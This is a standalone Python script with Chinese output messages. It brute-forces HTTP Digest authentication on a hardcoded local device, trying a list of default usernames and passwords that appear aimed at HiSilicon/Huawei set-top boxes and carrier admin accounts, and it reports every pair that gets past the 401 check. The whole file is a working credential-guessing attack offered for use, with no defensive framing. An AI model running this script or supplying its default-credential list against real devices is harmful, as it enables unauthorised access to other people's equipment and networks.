# -*- coding: utf-8 -*-
import socket, hashlib, itertools
HOST="192.168.50.52"; PORT=7546
REALM="testrealm@host.com"; NONCE="abcdef"; QOP="auth"; URI="/"
def md5(x): return hashlib.md5(x.encode()).hexdigest()
def req(authheader):
    s=socket.socket(); s.settimeout(3); s.connect((HOST,PORT))
    r=("GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: %s\r\nConnection: close\r\n\r\n"%(HOST,authheader)).encode()
    s.sendall(r)
    d=b""
    while True:
        c=s.recv(4096)
        if not c: break
        d+=c
        if len(d)>6000: break
    s.close(); return d.decode("utf-8","ignore")
users=["admin","root","user","huawei","hisilicon","hi3798","telecomadmin","CMCCAdmin","stb","operator","test","guest"]
pws=["admin","123456","root","password","","hi3798","hisilicon","1234","8888","6666","test","admin123","nE7jA%5m","aDm8H%MdA"]
found=[]
for u in users:
    for p in pws:
        ha1=md5("%s:%s:%s"%(u,REALM,p)); ha2=md5("GET:%s"%URI)
        resp=md5("%s:%s:00000001:0a4f113b:%s:%s"%(ha1,NONCE,QOP,ha2))
        ah=('Digest username="%s", realm="%s", nonce="%s", uri="%s", '
            'algorithm=MD5, response="%s", qop=%s, nc=00000001, cnonce="0a4f113b"'%(u,REALM,NONCE,URI,resp,QOP))
        r=req(ah)
        head=r.split("\r\n")[0]
        if "401" not in head:
            print("!! 命中 %s / %s  -> %s"%(u,p,head))
            print(r[:600]); found.append((u,p))
print("尝试 %d 组合，命中 %d"%(len(users)*len(pws),len(found)))
